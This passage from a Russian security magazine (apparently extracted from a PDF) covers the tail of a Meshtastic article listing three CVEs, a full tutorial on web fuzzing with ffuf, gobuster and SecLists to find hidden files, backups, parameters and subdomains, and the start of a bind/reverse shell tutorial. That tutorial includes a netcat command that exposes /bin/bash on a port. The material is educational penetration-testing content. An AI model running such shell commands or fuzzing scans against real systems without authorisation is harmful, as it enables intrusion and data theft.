сивые чирпы. Чтобы увидеть их, придется увеличить фреймрейт у водопада
примерно до 10 тысяч кадров. После чего мы увидим быстро пролетающие
по водопаду наклонные линии.





            Водопады SDR++ особенно красивы в это время года

Трафик можно записать в WAV и анализировать в других программах, но это
выходит за рамки моего эксперимента.


ИЗВЕСТНЫЕ УЯЗВИМОСТИ

В этом году были найдены и опубликованы несколько серьезных уязвимостей
в Meshtastic.


CVE-2025-55293
До версии 2.6.2 включительно атакующий мог перезаписать чужой publicKey
на свой, после чего свободно читать отправляемые чужой ноде приватные
сообщения. Для  этого  сначала он посылал NodeInfo с  пустым полем
publicKey, чем стирал запись о старом ключе. А вторым сообщением под‐
менял его на новый, который клиенты считали впервые встреченным.


CVE-2025-52464
До версии 2.6.10 включительно существовало две проблемы , приводящие
к одной и той же уязвимости.
   Первая была на стороне производителя. Он ставил прошивку на одно
устройство, а после раскатывал ее копии на всю партию. Из‑за чего все
устройства имели один на всех общий набор ключей. Это позволяло зло‐
умышленнику читать чужие сообщения и даже отправлять их от чужого имени.
   Вторая проблема заключалась в низкой энтропии при генерации ключа.
Так как ключ генерировался в момент первого включения, устройство имело
практически пустой пул для генерации псевдослучайных значений. Что снова
приводило к дублированию ключей на разных устройствах.
  В новой прошивке момент выбора ключей отложен вплоть до меню
выбора региона. Это гарантирует, что устройство придет без готовых ключей
от завода и ГПСЧ накопил достаточно энтропии от системного таймера.


CVE-2025-24797
До версии 2.6.1 включительно в прошивке была классическая возможность
переполнения буфера , что могло привести к удаленному исполнению кода!
Ошибка происходила при вызове memcpy при получении специально сфор‐
мированного пакета с неправильными заголовками. Проблема была найдена
фаззингом. Но сколько их еще найдено не было?


ЗАКЛЮЧЕНИЕ

Meshtastic — это современный пейджер, к тому же абсолютно бесплатный.
Особенно меня впечатляет, что Meshtastic на 100% открытый проект. Пол‐
ноценное устройство, которое можно разобрать по косточкам. И при желании
даже сделать свой форк — как прошивки, так и аппаратный!
   Кроме того, Meshtastic — это дружелюбное сообщество радиолюбителей,
с которыми можно сходить выпить пивка и завести друзей: по моим наб‐
людениям, в комьюнити много профессиональных айтишников. Так что беги
настраивать свою первую ноду. И увидимся на свободной волне! © X
ВЗЛОМ





Веб‑фаззинг — это способ узнать о сайте
больше, чем хотел бы разработчик. Нем‐
ного  сканирования, и атакующий может
найти скрытые файлы, конфиги или другую                                                                                         ret0x2A
                                                                                            @ret0x2Aинфу, которая  станет  точкой  входа. Эта
статья покажет, как методично и практично
выжимать     максимум     информации
из веб‑приложений.


           WARNING

                        Статья имеет ознакомительный характер и пред‐
                          назначена для  специалистов по безопасности,
                          проводящих  тестирование в рамках  контракта.
                       Автор  и  редакция  не  несут  ответственности
                        за любой  вред,  причиненный с  применением
                           изложенной информации. Распространение вре‐
                         доносных программ, нарушение работы систем
                      и  нарушение  тайны  переписки  преследуются
                      по закону.


Fuzzing — автоматический метод тестирования, когда приложению на вход
подаются случайные или недопустимые данные. Команда OWASP, объясняя
фаззинг, предлагает рассмотреть игру, в которой пользователю задается
вопрос и предоставлены три варианта ответа: 1, 2 или 3. Но что, если в ответ
отправить 5? Или 255? Может быть, вообще не число, а символ? Это клас‐
сический метод фаззинга.


Легенда о появлении фаззинга
В восьмидесятых годах профессор Бартон Миллер и его команда работали
над проектом по тестированию надежности программ в условиях помех.
По легенде, ученые обратили внимание на «белый шум» на телефонной линии
во время грозы. Этот шум и называют fuzz. Команда решила попробовать
«зашуметь» данные на вход программы — подавать случайные, бессмыс‐
ленные, «размытые» (fuzzy) данные.



В вебе хакеры фаззят, чтобы найти чувствительные части приложения: папку
с уязвимой админкой, дамп базы данных или автокопию конфига. Фаззинг
на вебе — это перечисление по заранее составленным словарям.
   Тулза для фаззинга построчно проходит словарь, отправляя значения
как часть запроса. Процесс можно представить в виде диалога между кли‐
ентом и сервером:

 — Есть файл passwords.txt?
 — Нет.
 — Может, password.txt?
 — Тоже нет.
 — Может, wp-config.php.bac?
 — А это есть, держи содержимое...

Теперь у тебя в руках креды от базы данных и прочее, что лежало в забытом
файлике.





По  сути, процесс больше похож на подбор паролей по словарю, чем
на реальный фаззинг, но, раз уж такое название прижилось, будем исполь‐
зовать его.


СЛОВАРИ

Словари — это заранее составленные списки вариантов. Бывают словари
общего назначения вроде списка интересных директорий и имен файлов.
Пример словаря:


.bash_history
.bashrc
.cache
.config
.cvs
.cvsignore
.env
.forward
.git
.git-rewrite

Этот словарь ориентирован на поиск чувствительных файлов. Если мы вдруг
найдем https://site.com/.gitignore, есть шанс, что внутри отыщутся пути
к другим интересным файлам.
   Многие названия из списка имеют мало шансов засветиться в сети. Тот же
.env обычно закрыт правилами веб‑сервера, а .bash_history почти никогда
не попадает в папку веб‑сервера.
  Но отличительная черта фаззинга как раз в том, что проверяются даже
самые редкие варианты. Мы ведь хотим знать, что админ случайно оставил
свой .bash_history в общем доступе? Значит, не помешает проверить!
   Существуют словари, составленные специально для определенных задач.
Пример первых строк из списка плагинов WordPress :


0-delay-late-caching-for-feeds
0-errors
0gravatar
0mk-shortener
001-prime-strategy-translate-accelerator
1-1
1-bit-audio-player

Если мы тестируем сайт на WordPress, то можем обращаться к таким адре‐
сам, используя этот список:


https://site.com/wp-content/plugins/название-плагина/

Так мы определим, какие плагины установлены на сайте, и если отыщутся уяз‐
вимые версии, то сможем поискать готовые эксплоиты для них или создать
самостоятельно по описаниям уязвимостей.
   Есть целые библиотеки словарей вроде популярного SecLists (он предус‐
тановлен на Kali) и FuzzDB . В наборах файлы обычно разбиты по категориям.
Я буду использовать SecLists, папку Discovery. В этой папке лежит все необ‐
ходимое для сбора данных о веб‑приложении: словари для DNS-фаззинга,
большие списки имен файлов и папок, перечисления API и специфические
имена для разных CMS.





              Часть папки Discovery/Web-Content из SecLists

Установи оба набора на свою машину и покопайся в папках, разберись, какие
словари есть внутри.
   Если в наборе нет подходящего словаря, ищи на GitHub по ключевым сло‐
вам вроде wordlist . Например, linux files wordlist . Такие словари помогут
тебе, если наткнулся на Local File Inclusion. Профаззив по словарю, получишь
список файлов системы, к которым у тебя есть доступ. После можно спокойно
выкачать интересные варианты и посмотреть, что внутри.


             INFO

                        Подробнее  о  том,  как  работает  Local   File
                             Inclusion, читай в статье « File Inclusion и Path
                             Traversal. Разбираем две базовые веб‑уязвимос‐
                         ти ».


Топовые хакеры и пентестеры собирают собственные наборы. При работе
тебе будут попадаться файлы и директории с необычными названиями. Иног‐
да — с опечатками в названии. Это хорошие варианты для будущих проходов
по таргетам.


ТУЛЗЫ ДЛЯ ФАЗЗИНГА

Дальше в статье я буду использовать две самые популярные утилиты: ffuf
и gobuster. Обе предустановлены в Kali и подобных ОС. Однако они без проб‐
лем устанавливаются и работают на любой операционной системе.





Ffuf — быстрый и гибкий фаззер для веб‑приложений. Поддерживает фаззинг
URL, параметров, заголовков, JSON-тел и логики состояний. С помощью ffuf
можно выполнять 90% любых фаззингов. Пример запуска:


ffuf -u "https://target.com/search?query=FUZZ" -w params.txt

Параметр -u нужен для задания пути к таргету. Макрос FUZZ указывает проге,
куда подставлять значения из словаря. Точка для проверки необязательно
должна быть внутри URL. При необходимости можешь хоть User-agent фаз‐
зить, указав -H "User-agent: FUZZ" .
   Завершает команду параметр -w , через него задаешь путь к словарю.
   Другие параметры, которые могут понадобиться сразу:
 • -e — список расширений, перечислять через запятую. Например: .php,.
  txt,.json,.yml . При  фаззинге  каждая  строка  будет  отправлена
   без расширения, потом с каждым расширением отдельно;
 • -t — количество потоков. По умолчанию ffuf работает в 40 потоков;
 • -recursion и -recursion-depth — использование рекурсии и глубина
   рекурсии. Можешь хоть все возможные папки обойти, только не забудь
   включить вывод в лог, иначе есть шанс потерять большую часть инфы.
   Рекурсивный фаззинг может затянуться;
 • -o — output или путь к файлу лога;
 • -fc — фильтрация результата по коду статуса. Перечисленные статусы
   будут отброшены. Варианты использования: -fc 403 ; -fc 301,302 ; -fc
  400-499 ;
 • -fs — фильтрация результата по размеру ответа в байтах;
 • -mc и -ms — как и предыдущие две, но не отфильтровывать, а матчить.
   Например, если задать -mc 204 , это приведет к тому, что ffuf покажет те
   значения словаря, которые дали статус 204 ;
 • -p — задержка в секундах между запросами на случай, если сервер жад‐
  ный и не хочет быстро фаззиться.


        WWW

                     Для  обучения  фаззингу  с  ffuf  есть отличный
                       ресурс  FFUF.me .  Доступен  без  регистрации
                      и SMS. В каждом упражнении приводится пра‐
                           вильная команда для ffuf, но при желании можешь
                         адаптировать команды под другие тулзы.


Gobuster — классический инструмент для перебора директорий, файлов,
поддоменов.  Отличается  простотой  и  стабильностью.  Поддерживает
перебор бакетов AWS и GCS. Умеет работать с TFTP. Пример запуска:


gobuster dir -u https://target.com -w wordlist.txt -x php,txt,html

Сразу после gobuster указывается команда или режим работы. В примере
выше мы используем dir — он нужен для поиска файлов и папок. Другие
варианты: dns, fuzz , vhost , gcs, s3 , tftp .
   Как и в ffuf, в параметре -u указан URL таргета, а -w передает путь к сло‐
варю. Параметр -x работает, как -e в ffuf: сначала тулза выполнит запрос
со строкой из словаря, а затем по очереди добавит к строке расширения.
Этот параметр кратно увеличивает время фаззинга, но дает шанс найти инте‐
ресные файлы.
   Инструментов для фаззинга множество. Вот еще некоторые популярные
тулзы.
   Feroxbuster —  современный  рекурсивный  брутфорсер  директорий
на Rust. Поддерживает автоматическую рекурсию и гибридный подход (нап‐
ример, может извлекать ссылки из JS-файлов). Написан на Rust и работает
очень быстро.


feroxbuster -u https://target.com -w wordlist.txt -x php,js,html

Wfuzz — мощный фаззер для сложных сценариев: параметры, заголовки,
cookies, POST-тела, логика состояний. Wfuzz — это фреймворк, поддержи‐
вающий плагины, что позволяет расширять набор его возможностей.


wfuzz -c -z file,wordlist.txt https://target.com/FUZZ

Dirsearch — инструмент на Python для перебора директорий и файлов. Мак‐
симально прост в использовании.


dirsearch -u https://target.com -w wordlist.txt -x 403,404


ФАЗЗИНГ КАТАЛОГОВ И ФАЙЛОВ

Это самый простой  классический вариант фаззинга. Ты просто ищешь
каталоги и файлы, в надежде наткнуться на что‑то существенное. Пример
для ffuf:


ffuf -w SecLists/Discovery/Web-Content/common.txt -u http://ffuf.me/
cd/basic/FUZZ

Тот же пример для gobuster:


gobuster dir -u "http://ffuf.me/cd/basic/" -w SecLists/Discovery/Web-
Content/common.txt

Обе тулзы отправят тысячи запросов, чтобы понять, какие названия из сло‐
варя common.txt встречаются в папке из URL. Обе найдут папку class и файл
development.log. Папка class намекает, что в ней может быть что‑то инте‐
ресное. Есть смысл запустить повторный фаззинг, но уже на http://ffuf.
me/cd/basic/class . А log-файл сам по себе неплохой результат. В логе раз‐
работки можно найти куски запросов. Иногда в этих запросах лежат и креды.





                                Результат работы ffuf

Используй параметр -e в ffuf или -x в gobuster, чтобы перечислять с учетом
расширений:


gobuster dir -u "https://target.com/" -w SecLists/Discovery/Web-
Content/directory-list-lowercase-2.3-big.txt -x py,sh

Не зацикливайся только на технологиях веб‑приложения. Если сайт работает
на PHP, ищи не только PHP-файлы. Например, мне на одном таргете фаззинг
по directory-list-lowercase-2.3-big.txt из SecLists принес папку bck.
Внутри удалось найти backup.sh :


#!/bin/bash


SRC_DIR="/var/www/html"
TMP_DIR="/tmp"
DATE=$(date +"%Y-%m-%d_%H-%M-%S")
ARCHIVE_NAME="html_backup_${DATE}.tar.gz"
ARCHIVE_PATH="${TMP_DIR}/${ARCHIVE_NAME}"


FTP_HOST="ftp.example.com"
FTP_USER="ftp_user"
FTP_PASS="ftp_password"
FTP_DIR="/backups"


# ...

Если найдешь такой файл, у тебя в руках окажется полноценный архив
веб‑приложения. Возможно, даже с базой данных.
   Одно из моих любимых занятий — искать бэкапы. Это файлы вроде app.
rar, data.db , bac.sql, которые админы  часто создают при резервном
копировании сайта. Когда я получаю в работу таргет, одна из первых про‐
верок — это поиск таких файлов. Примерно каждый десятый случай приносит
результаты.
  Для поиска бэкапов есть готовые словари вроде backup_files_only.txt . Кон‐
кретно этот словарь старенький, варианты с датами заканчиваются на 2020.
zip. Но легко добавить в него актуальные значения и заполучить в свой арсе‐
нал мощный словарь.


             INFO

                          Работая  с  gobuster,  используй  параметр --
                   discover-backup  или  сокращенное  --db .
                  С этим параметром тулза сама будет добавлять
                          разные варианты расширений бэкапов.


Другой интересный вариант — автоматические копии файлов. Некоторые
редакторы (Vim, Emacs) и инструменты деплоя создают автокопии с суф‐
фиксом ~ (тильда) или похожими маркерами. Например, при редактировании
wp-config.php появляется wp-config.php~ . Файл может сохраниться, если
оборвалась SSH-сессия, крашнулся редактор или в других непредвиденных
случаях.
   Такой файл веб‑сервер обычно не обрабатывает как PHP и отдает как ста‐
тический контент, нередко с MIME text/plain . В результате атакующий
может получить настройки (зачастую — с учетными данными) или исходный
код приложения.
   Искать можно не только бэкапы или какие‑то другие забытые файлы.
Представь, что в твоей компании есть облачное хранилище документов. Нич‐
то не мешает тебе проверить, насколько надежен механизм генерации ссы‐
лок. Если используется, например, UUID первой версии, есть шанс сгенери‐
ровать пару тысяч схожих идентификаторов и посмотреть, какие документы
получится вытащить.
   Это будет явная утечка данных, среди которых могут оказаться конфиден‐
циальные документы. Если у тебя есть разрешение на такие тесты, можешь
глянуть, не платят ли бухгалтеру больше, чем тебе.
   Установи инструменты для генерации UUID:


sudo apt install uuid-runtime

Запусти простой Python-сервер:


python -m http.server

Построй пайп от генерации UUID до ffuf:


seq 1 50 | xargs -n1 uuidgen -t | ffuf -w - -u 'http://localhost:
8000/FUZZ'





                      Пример с генерацией UUID

Если говорить о поиске конфиденциальных документов, пробуй фаззить пап‐
ку загрузки. Веб‑приложения часто используют папку uploads для хранения
загруженных файлов. Составь словарь с интересными вариантами названий
и просканируй на наличие .pdf, .doc, .docx и документов других типов.
Но помни, что сканирование не пассивное и отразится в логах. Искать подоб‐
ные документы можно, только если у тебя есть разрешение от владельца
ресурса!


ФИЛЬТРАЦИЯ РЕЗУЛЬТАТОВ

Ты столкнешься с кривыми результатами. Больше всего расстраивает, когда
сервер настроен неправильно и вместо ошибок возвращает всегда 200.
В этом случае остается только фильтровать результаты.
   Фильтры бывают двух типов:
 • match — тулза покажет только совпадения;
 • filter — отсеет все, что попадает под фильтр.

В ffuf набор фильтров достаточно мощный. Кроме статуса ( -fc) и длины отве‐
та в байтах  ( -fs), ты можешь проверять количество строк в ответе  ( -fl)
или количество слов ( -fw). Еще есть -ft, отсеивающий результаты по вре‐
мени получения первых байтов. Хочешь отфильтровывать ответы, содер‐
жащие какое‑то значение? Есть опция фильтрации по регулярке -fr.
   Вишенка на торте — сочетание нескольких фильтров. Через -fmode укажи,
в каком режиме хочешь сочетать: or или and (то есть «хотя бы одно правило
должно сработать» либо «все правила должны сработать»). По умолчанию
используется or .
   Фильтры ffuf поддерживают перечисления и диапазоны.


ffuf -u 'https://target.com/FUZZ' -w SecLists/Discovery/Web-Content/
common.txt -fc 301,302,400-410 -fl 1000 -fw 700-1000




                                     Продолжение статьи →
                   ← НАЧАЛО СТАТЬИВЗЛОМ
       ВЕБ-ФАЗЗИНГ
    С САМОГО НАЧАЛА
         УЧИМСЯ ПЕРЕБИРАТЬ КАТАЛОГИ
           И ИСКАТЬ СКРЫТЫЕ ФАЙЛЫ
                         НА САЙТАХ





                      Обрати внимание на поля Filter

Чтобы переключить с режима filter на match , замени первую букву. Нап‐
ример, вместо -fl юзай -ml.
  В gobuster ситуация с фильтрами хуже. Есть фильтр по длине: --exclude-
length value или --xl ; фильтр, исключающий коды статуса: --exclude-
statuscodes , короткий вариант -b . И перечисление искомых статусов: --
status-codes или -s . В режиме vhost есть еще  фильтр --exclude-
hostname-length ( --xh ), который ограничивает итоговую длину имени хоста.
   Фильтры gobuster зависят от режима и могут менять свое длинное наз‐
вание: --exclude-statuscodes режима fuzz превращается в --status-
codes-blacklist в dir.
   Вывод один: если нужна сложная фильтрация, лучше не брать gobuster.
Но в большинстве случаев достаточно и его возможностей.


ФАЗЗИНГ ПОДДОМЕНОВ И ВИРТУАЛЬНЫХ ХОСТОВ

На поддоменах и виртуальных хостах бывает много интересного: админки,
тестовые версии сайта, CRM и другие системы. Каждая из них — это новый
вектор атаки. С виду неприступный сайт может оказаться уязвимым в бете.
В 2016 году исследователь Ананд Пракаш обнаружил уязвимость в бета‑вер‐
сии  Facebook.  На  поддоменах  beta.facebook.com  и  mbasic.beta.
facebook.com  отсутствовало  ограничение на количество попыток  ввода
одноразового кода. Хакеры без ограничений подбирали OTP, как мы с тобой
в статье про брутфорс .


Поддомены
Поддомен (субдомен) — это объект DNS, он существует, только если есть
DNS-запись. Запись типа A указывает на IPv4, AAAA — на IPv6. CNAME создает
псевдоним или альтернативную ссылку на другой домен/хост. MX использует‐
ся для почтовых поддоменов. NS делегирует обработку запроса другому DNS-
серверу, например если хочешь спрятать конкретный поддомен за Cloudflare.
   Поддомен не всегда резолвится в тот же  IP, что и основной домен.
Это шанс найти больше серверов, среди которых может оказаться уязвимый.
А это уже точка входа.
   Попробуй запустить фаззинг поддоменов Google. Пример команды:


gobuster dns -d "google.com" -w /seclists_path/Discovery/DNS/
common...

Оказывается, у Google есть поиск авиабилетов и регистратор доменов !
   Важно понимать, как именно разные инструменты фаззят поддомены.
Запусти tcpdump на 443-м порте, чтобы проанализировать трафик:


sudo tcpdump -i any port 443

Запусти ffuf на перебор поддоменов:


ffuf -u "https://FUZZ.google.com" -w SecLists/Discovery/DNS/
subdomains-top1million-5000.txt

Ты увидишь огромное количество запросов. Сначала ffuf резолвит DNS, после
создает соединение на 443-м  порте,  проходит через TLS-рукопожатие
и только тогда отправляет HTTP-запрос.
   Анализируя поведение gobuster, ты не увидишь ни одного соединения
на 443-м порте. Все, что сделает gobuster, — это резолв DNS. На основании
результата он примет решение: есть такой поддомен или нет.
   Дело не только в скорости работы, но и в шумности. HTTP-запросы прой‐
дут через Web Application Firewall и обязательно лягут в логи. О существо‐
вании DNS-запросов, скорее всего, никто никогда не узнает (если только ты
не выполняешь тестирование внутри корпоративной сети).
   Попадаются сайты с поддоменами wildcard, то есть в их A или CNAME про‐
писан домен со звездочкой: *.example.com. Это значит, что DNS резолвит
все поддомены в один и тот же ресурс.
   Натолкнувшись на wildcard, переходи с gobuster на ffuf. «Бастер» хорошо
определяет, что поддомен wildcard, но не очень хорошо с этим работает.
Тебе нужны фильтры по длине возвращаемого контента или коду статуса, зна‐
чит, не обойтись без HTTP-запросов.


Виртуальные хосты
В отличие от поддоменов, виртуальный хост никак не обозначен в DNS-
записях. Виртуальный хост — это настройка веб‑сервера. Сервер получает
запрос, смотрит заголовок Host и сравнивает с теми вариантами, которые
прописаны в конфигах. Если найдено совпадение, сервер возвращает то, что
указал админ.
   Пример того, как виртуальные хосты могут выглядеть в конфиге веб‑сер‐
вера Nginx:


server {
    listen 80;
    server_name example.com;
    root /var/www/main;
}


server {
    listen 80;
    server_name beta.example.com;
    root /var/www/beta;
}


server {
    listen 80;
    server_name admin.example.com;
    root /var/www/admin;
}

Для поиска виртуальных хостов используются HTTP-запросы. У gobuster
это специальный режим vhost :


gobuster vhost -u 'http://google.com' -w SecLists/Discovery/Web-
Content/directory-list-lowercase-2.3-small.txt --append-domain

Заметил, что при поиске поддоменов я указывал домен через -d , а в vhost
передаю URL через -u ? Разница связана с типом сканирования. В первом
случае gobuster отправлял DNS-запросы, а во втором — HTTP.
   Обрати внимание на опцию --append-domain, она говорит тулзе добав‐
лять значение из словаря к  указанному домену. Если не использовать
параметр, на IP полетят запросы такого вида:


GET / HTTP/1.1
Host: admin

С --append-domain запрос будет выглядеть так:


GET / HTTP/1.1
Host: admin.google.com

Чаще всего есть смысл запускать сканер с --append-domain . Но бывают
ситуации, когда прогон без добавления списка дает результат. Например,
если админ разместил на сервере много доменов и сделал себе одну общую
админку:


server {
    listen 80;
    server_name site1.com;
    root /var/www/site1;
}


server {
    listen 80;
    server_name site2.com;
    root /var/www/site2;
}


server {
    listen 80;
    server_name admin;
    root /var/www/admin;
}

Тут нужно понять тонкий момент: фаззилки перед отправкой конечного зап‐
роса резолвят домен в IP, и запрос уходит на конкретный сервер. Сервер,
получив запрос, смотрит на Host и ищет совпадение в конфиге. Если в хосте
указано admin и в конфиге есть admin , сервер вернет контент.
   То же  произойдет, если в server_name  окажется  кривая  регулярка,
которая  вернет ложное  совпадение. Например,  регулярка server_name
~admin; поймает любую строку, содержащую admin : admin , admin.example.
com, foo-admin-bar , myadmin.com, something-admin-123.net.
   Чтобы фаззить виртуальные хосты ffuf, запусти


ffuf -u 'https://google.com' -H 'Host: FUZZ.google.com' -w SecLists/
Discovery/DNS/subdomains-top1million-5000.txt


МАЙНИНГ ПАРАМЕТРОВ

Копаясь с одним таргетом (на что у меня было разрешение от владельца), я
наткнулся на один интересный параметр — nologin . Позже выяснилось, что
программист добавил параметр на время  разработки и забыл  удалить
при выкатывании в прод. Параметр позволял авторизоваться от имени адми‐
на без логина и пароля. Обход авторизации был удобен при тестах, чтобы
не вводить каждый раз данные. Но в проде это колоссальная дыра.
   Найти параметр помог фаззинг по собственному словарю. Потрениро‐
ваться можешь в лабах по майнингу параметров на FFUF.me . Пример коман‐
ды:


ffuf -w SecLists/Discovery/Web-Content/burp-parameter-names.txt -u
http://ffuf.me/cd/param/data?FUZZ= 1

Тулза прогонит все 6453 варианта названий параметров и найдет скрытый
параметр debug .
  Для gobuster используй режим fuzz :


gobuster fuzz \
  -u "http://ffuf.me/cd/param/data?FUZZ=1" \
  -w SecLists/Discovery/Web-Content/burp-parameter-names.txt \
  -b 400





                   Результат поиска параметра через gobuster

На практике найти параметр бывает нелегко. Веб‑приложение может филь‐
тровать значения и просто отбросить единичку. Если есть надежда найти
параметр, пробуй разные варианты. Например, key, длинное число, набор
символов, хеш MD5 и идентификаторы UUID.
   Внимательно изучи контекст, в котором ты пытаешься найти параметр.
Посмотри на то, как используются явные параметры ссылок, чтобы пред‐
положить, как мыслит разработчик.
  Не думай, что майнинг параметров — это только про URL и GET-запросы.
Пробуй  майнить параметры в POST и  других типах  запросов. Пробуй
параметры как в URL, так и в теле запроса. Только не забудь указать верный
Content-type.
   Тестируй cookie, в них тоже есть место для майнинга скрытых вариантов.
Если в теле запроса JSON, подставь собственные ключи. Иногда заголовки
возвращают неожиданный результат. Помни, фаззить можно всё!
   Вот, к примеру, фаззиг куки в ffuf через параметр -b :


ffuf -u "http://example.site" \
  -b "FUZZ=key" \
  -w SecLists/Discovery/Web-Content/burp-parameter-names.txt

К сожалению, gobuster отказывается видеть макрос FUZZ в параметре, опре‐
деляющем куки ( -c или --cookies). Единственный вариант — это исполь‐
зовать -H и прописывать куку через заголовок.
   Майнинг ключа в JSON:


ffuf -u "http://example.site" \
  -X POST \
  -H "Content-Type: application/json" \
  -d '{"known":"value","FUZZ":"test"}' \
  -w SecLists/Discovery/Web-Content/burp-parameter-names.txt \
  -ac

Вариант с gobuster:


gobuster fuzz \
  -u "http://example.site" \
  -m POST \
  -H "Content-Type: application/json" \
  -B '{"known":"value","FUZZ":"test"}' \
  -w SecLists/Discovery/Web-Content/burp-parameter-names.txt

Как понять, что есть смысл фаззить параметры? Первое — ты видишь, что
в приложении используется много разных параметров. Разработчик мог
запутаться и забыть удалить что‑то лишнее. Второе — есть файлы, которые
себя странно ведут. Например, фаззингом по файлам ты нашел файл,
который возвращает 0 байт. Или сервер ругается и говорит, что у тебя недос‐
таточно прав для доступа. Или выкидывает какую‑то из 500-х ошибок. Пробуй
скормить файлу параметры — возможно, поведение изменится.
   Понять, что ты наткнулся на скрытый параметр, можно по изменению
поведения: сервер вернул другой объем контента, прилетает другой код ста‐
туса, меняется тайминг ответа. Перепроверь, выполнив запрос несколько раз
вручную. Если поведение сохраняется,  значит, ты  наткнулся на реально
существующий параметр.
   Когда  параметр  найден,  начинай  фаззить  возможные  значения.
При выборе словаря опирайся на контекст параметра. Например, фаззя куку
role , пробуй значения из серии admin , administrator , dev, boss и прочие
значения, указывающие на роль.


ЗАКЛЮЧЕНИЕ

Мы с тобой довольно глубоко нырнули в тему фаззинга. Не только обсудили
поиск файлов и папок, но и подробно разобрались с поддоменами и вир‐
туальными хостами. Покопались в майнинге параметров.
   Охватить фаззинг полностью одной статьей не получится. Этот метод
весьма обширный. Например, ты можешь встретить статьи, где фаззинг
используется для SQL Injection. И это тоже правильный подход, ведь поиск
SQL-инъекции — это тоже отправка на вход неожиданных данных.
  При помощи фаззинга можно искать что угодно. Ты можешь взять REST
API и пытаться найти в нем недокументированные методы, прогоняя API
по словарям. То же касается скрытых полей для методов API. Можешь пытать‐
ся составить список коллекций MongoDB, если нашел NoSQL Injection, через
LFI составлять карту сайта.
   Как видишь, вариантов использования фаззинга в работе бесконечное
множество. Начиная статью, я ставил себе две цели:
 1. Познакомить с основами фаззинга.
 2. Дать интересные и классные идеи для читателя, чтобы он мог видеть кар‐
   тину объемно и применять фаззинг в любых ситуациях.

Напиши в комментариях, насколько мне удалось достичь своих целей! © X
ВЗЛОМ





Если ты читаешь «Хакер» и до сих пор
не   разобрался   с   тем,   что   такое
реверс‑шелл, то эта статья для тебя. Мы
с самого начала разберем, что такое bind                                                                                cu63
                                                                                   Вирусный аналитикshell и reverse shell, и я на простейших при‐                                                                                    и любитель кофе
мерах покажу, как такие оболочки  орга‐             @coffee_cube
низовать.


Когда ты представляешь себе хакера, в голову приходит картина: он сидит
в темной комнате, натянув капюшон, клацает по клавишам и кричит, что он
в системе. Никто не думает о том, что он пешком будет ходить к атакуемому
компьютеру и самостоятельно что‑то там нажимать, верно?
   Чтобы, как в кино, выкрикнуть «Я в системе!», нужно получить к ней удален‐
ный доступ. В ход идет все: фишинг, вредоносы, эксплуатация уязвимостей,
подкупы, мольбы самостоятельно ввести команды на компьютере. Этот этап
мы здесь рассматривать не будем, а поговорим о том, как, собственно,
работает этот самый удаленный доступ.


           WARNING

                        Статья имеет ознакомительный характер и пред‐
                          назначена для  специалистов по безопасности,
                          проводящих  тестирование в рамках  контракта.
                       Автор  и  редакция  не  несут  ответственности
                        за любой  вред,  причиненный с  применением
                           изложенной информации. Распространение вре‐
                         доносных программ, нарушение работы систем
                      и  нарушение  тайны  переписки  преследуются
                      по закону.



ШЕЛЛ

Давай сначала поймем, что это вообще за шелл такой. Любой атакующий
заинтересован в том, чтобы получить побольше всего с атакуемого компь‐
ютера. Украсть файлик в этом плане далеко не так интересно, как запустить
команду. Если есть возможность выполнять команды от имени администра‐
тора, то компьютер полностью в наших руках: можем читать любые данные,
незаметно запускать программы, делать снимки камерой или даже управлять
каким‑то подключенным оборудованием, если такое имеется.
   Поэтому удаленное выполнение команд (remote command execution, RCE)
обычно считается критической уязвимостью, и получение интерактивного
терминала с возможностью выполнять команды в системе, как наиболее
опасный случай RCE, — это самый лакомый кусочек для хакера.
   Шеллом  называют  программную  оболочку,  которая  предоставляет
интерфейс для взаимодействия пользователя с операционной системой.
Через шелл можно выполнять команды, запускать программы, управлять фай‐
лами и процессами.
  В Windows есть две такие командные оболочки — cmd.exe и powershell.
exe, а в Linux их может быть сколько угодно. Самая распространенная и при‐
сутствующая в любом Linux — /bin/bash , но может быть /bin/sh (в стиле
Unix), /bin/zsh (более современная) и так далее.
  С технической точки зрения шелл — это обычный пользовательский про‐
цесс, который читает команды из входа ( stdin ), обрабатывает их и выводит
результат на выход  ( stdout) или сообщение об ошибке — в Unix/Linux
для этого предназначен специально выделенный поток stderr.
  В Linux есть понятие перенаправления потоков, и оно отлично упрощает
работу для атакующего. Если он может перенаправить к себе стандартные
потоки, то сможет пользоваться системой, будто он физически сидит за нуж‐
ным компьютером.
  Для Linux файл и сетевой сокет выглядят одинаково: это просто источники
ввода и вывода. Поэтому шеллу, по сути, все равно, общается он с клавиату‐
рой или с сетью.
   Дальше в примерах я буду использовать /bin/bash , но все остальные
оболочки устроены схожим образом и различаются либо реализацией, либо
тонкостями синтаксиса команд.
  Но чтобы иметь возможность запускать команды удаленно, требуется
еще сетевое соединение, через которое и будет происходить общение.
Далее мы его рассмотрим.


BIND SHELL

Самый простой способ установить удаленное соединение с компьютером —
это запустить там программу, которая будет слушать порт и передавать
полученные команды процессу с оболочкой.





На схеме видно следующие три шага:
 1. На хосте жертвы запускается сервер, который ожидает входящее соеди‐
   нение.
 2. Атакующий инициирует сетевое соединение с хостом жертвы.
 3. Жертва принимает входящее соединение.

Такой способ называется bind shell. Проще всего будет использовать утилиту
Netcat .
   Netcat ( nc ) — это сетевая утилита для чтения и записи данных через TCP-
и UDP-соединения. Она позволяет открывать сокеты, принимать входящие
подключения, устанавливать исходящие соединения и передавать данные
между процессами и сетью. Благодаря своей простоте и гибкости Netcat
широко используется для отладки сетевых сервисов, тестирования соеди‐
нений, передачи файлов, а  также в задачах информационной безопас‐
ности — в том числе для организации bind shell и reverse shell.
  На хосте жертвы я выполню следующую команду:


nc -lvvp 1337 -e /bin/bash

Она  запускает  сервер, который  ожидает  подключения на  порте 1337
и перенаправляет потоки stdin и stdout на вход командной оболочке /bin/
bash .


             INFO

                         Опция -e есть не во всех версиях Netcat. Во мно‐
                         гих дистрибутивах она отключена из соображений
                          безопасности. Здесь она  используется  только
                       для демонстрации принципа.





На атакующей машине запущу команду для подключения к жертве:


nc -nv 192.168.0.150 1337

А вот и результат.





Я получил удаленное соединение на атакуемой машине. Выглядит все прос‐
то. Но есть нюансы...


FIREWALL, NAT И ПРОЧИЕ ЗЛОДЕИ

Для успешного подключения к серверу нужно, чтобы IP-адрес и порт хоста
были доступны атакующему. Если сервер доступен только в локальной сети,
то и подключиться к нему мы сможем только из локальной сети.
  А еще есть такие замечательные вещи, как NAT или Firewall, которые
не дают так просто запускать команды на чужом компьютере. Давай раз‐
беремся с ними чуть подробнее.


Network address translation (NAT)
NAT — это механизм, при котором внутренние порты скрыты за одним внеш‐
